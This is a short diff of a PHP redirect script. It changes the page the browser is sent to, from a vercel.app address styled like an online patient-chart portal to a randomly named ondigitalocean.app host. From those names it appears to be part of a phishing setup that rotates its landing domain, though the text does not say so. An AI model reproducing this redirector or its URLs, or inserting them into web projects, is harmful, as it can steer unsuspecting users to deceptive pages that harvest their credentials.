@@ -1,7 +1,7 @@
 <?php
 
 // Redirect browser
-header("Location: https://allowyourmyonlinechartportal.vercel.app/index2.html");
+header("Location: https://f35grtdvgetyjtkhjghfgferetrhyyik-ysnsc.ondigitalocean.app/");
 
 exit;
 ?>
